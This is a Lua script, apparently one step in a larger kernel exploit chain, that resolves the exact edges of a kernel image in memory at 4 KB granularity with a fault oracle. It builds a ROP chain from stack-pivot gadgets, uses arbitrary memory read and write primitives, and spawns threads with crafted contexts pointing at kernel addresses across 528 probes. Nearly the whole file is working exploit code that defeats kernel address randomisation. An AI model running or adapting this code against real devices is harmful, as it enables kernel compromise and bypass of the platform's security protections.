-- CRASH_CLASS: HIGH
-- PROBE 1199c: fault oracle edge resolution at 4 KB
--
-- Context: 1199b found kernel image at 0xFFFFFFFFD4000000-0xFFFFFFFFDA5FFFFF
-- (51 steps at 2 MB). This probe resolves both edges at 4 KB (one page):
--   Section A: 8 pages below image start (confirm 2MB alignment)
--   Section B: 512 pages across last 2MB step DA400000-DA5FFFFF (find exact end)
--   Section C: 8 pages past image (confirm unmapped)
-- Total: 528 probes × 60ms ≈ 32 seconds

print("=== PROBE 1199c: EDGE RESOLUTION (4 KB) ===")
print("")

local STEP = 0x1000  -- 4 KB pages
local SLEEP_US = 60 * 1000

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function as_addr(t)
    local s = tostring(t)
    local m = s:match("0x(%x+)")
    if m then return tonumber(m, 16) end
    return to_num(t)
end
local function wq(a, v)
    pcall(function() memory.write_qword(uint64(a), uint64(v)) end)
end
local function rd(a)
    local ok, val = pcall(function() return memory.read_dword(uint64(a)) end)
    if ok then return to_num(val) end
    return nil
end

local fd = rd(signal.fd_addr) or 0
local pid = to_num(mk(20)())
print(string.format("[0] pid=%u fd=%u", pid, fd))
if fd == 0 then print("[!] fd=0 — aborting"); return end

-- Rebuild signal handler chain (same as 1199a/b)
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(mk(4), function()
    chain:push_set_rdx(0x100)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0xC0)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
chain:push_syscall_raw(mk(431), function() chain:push_set_rdi(0) end)
print("[1] chain rebuilt")

-- Allocate child resources
local page = 0x4000
local function mmap(sz)
    local ok2, a = pcall(function()
        return mk(477)(uint64(0), uint64(sz), uint64(3),
                       uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then
        for o = 0, sz - 8, 8 do wq(v + o, 0) end
    end
    return v
end

local Ctx = {
    MAGIC = 0x108, TYPE = 0x110,
    CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100
}
local block = mmap(page * 4)
local start = block + page * 4 - 0x200
local ctx = memory.alloc(0x500)
local ctxa = as_addr(ctx)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
print(string.format("[2] block=0x%X ctx=0x%X", block, ctxa))

-- Helper: probe one address
local spawned, failed = 0, 0
local function probe_addr(idx, hi, lo)
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(ctxa + Ctx.MAGIC, 0x480)
    wq(ctxa + Ctx.TYPE,  0x10000)
    wq(ctxa + Ctx.CS,    0x43)
    wq(ctxa + Ctx.SS,    0x3B)
    pcall(function()
        memory.write_qword(uint64(ctxa + Ctx.RIP),
            uint64(string.format("0x%X%08X", hi, lo)))
    end)
    wq(ctxa + Ctx.RSP, start)
    wq(as_addr(tb), 0)
    print(string.format("[T%03d] 0x%08X%08X", idx, hi, lo))
    local ok, rv = pcall(function()
        return mk(430)(uint64(ctxa), uint64(as_addr(tb)), uint64(0))
    end)
    if ok and to_num(rv) == 0 then spawned = spawned + 1 else failed = failed + 1 end
    wq(as_addr(ts), 0)
    wq(as_addr(ts) + 8, SLEEP_US * 1000)
    pcall(function() mk(240)(uint64(as_addr(ts)), uint64(0)) end)
end

-- ========== Section A: 8 pages below image start ==========
-- D3FFE000, D3FFF000 ... (8 pages below D4000000)
print("")
print("--- SECTION A: leading edge (8 pages below D4000000) ---")
local idx = 0
for i = 8, 1, -1 do
    local lo = 0xD4000000 - i * STEP
    probe_addr(idx, 0xFFFFFFFF, lo)
    idx = idx + 1
end

-- ========== Section B: 512 pages across last 2MB step ==========
-- DA400000 to DA5FF000
print("")
print("--- SECTION B: trailing edge (512 pages DA400000-DA5FFFFF) ---")
for i = 0, 511 do
    local lo = 0xDA400000 + i * STEP
    local hi = 0xFFFFFFFF
    if lo >= 0x100000000 then
        lo = lo - 0x100000000
        hi = hi + 1
    end
    probe_addr(idx, hi, lo)
    idx = idx + 1
end

-- ========== Section C: 8 pages past image ==========
-- DA600000 to DA607000
print("")
print("--- SECTION C: past image (8 pages from DA600000) ---")
for i = 0, 7 do
    local lo = 0xDA600000 + i * STEP
    local hi = 0xFFFFFFFF
    if lo >= 0x100000000 then
        lo = lo - 0x100000000
        hi = hi + 1
    end
    probe_addr(idx, hi, lo)
    idx = idx + 1
end

print("")
print(string.format("[E] total=%u spawned=%u failed=%u alive pid=%u",
    idx, spawned, failed, to_num(mk(20)())))
print("=== COMPLETE ===")
